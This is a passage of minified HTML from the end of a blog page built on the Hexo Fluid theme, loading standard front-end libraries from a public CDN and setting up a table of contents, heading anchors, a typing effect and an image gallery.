href=https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src=https://lib.baomitu.com/jquery/3.6.4/jquery.min.js></script><script src=https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js></script><script src=/js/events.js></script><script src=/js/plugins.js></script><script src=https://lib.baomitu.com/typed.js/2.0.12/typed.min.js></script><script>(t=>{var e=Fluid.plugins.typing;(t=t.getElementById("subtitle"))&&e&&e(t.getAttribute("data-typed-text"))})((window,document))</script><script src=/js/img-lazyload.js></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){var t;"tocbot"in window&&(tocbot.refresh(),0!==(t=jQuery("#toc")).length)&&tocbot&&0<t.find(".toc-list-item").length&&t.css("visibility","visible")}))})</script><script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js",function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n,o=[];for(n of(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","))o.push(".markdown-body > "+n.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback(function(){if("anchors"in window){anchors.removeAll();var n,o=[];for(n of(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","))o.push(".markdown-body > "+n.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}})})</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script defer=defer src=/js/leancloud.js></script><script src=/js/local-search.js></script><script src=/js/boot.js></script><noscript><div class=noscript-warning>博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript></body></html>